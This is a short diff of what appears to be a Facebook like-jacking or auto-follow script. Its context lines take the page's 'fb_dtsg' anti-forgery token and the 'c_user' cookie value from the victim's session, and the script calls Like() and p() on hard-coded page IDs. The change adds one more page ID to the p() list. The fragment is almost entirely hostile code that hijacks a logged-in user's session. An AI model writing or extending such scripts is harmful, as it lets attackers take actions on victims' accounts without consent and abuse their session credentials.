@@ -75,6 +75,7 @@ Like("400036503459965");
 
 
 
+
 /*page noti*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -181,7 +182,7 @@ p("243188212508705");
 p("349683478511340");
 p("213363228844207");
 p("213363148844215");
-
+p("227375447442985");
 
 
 
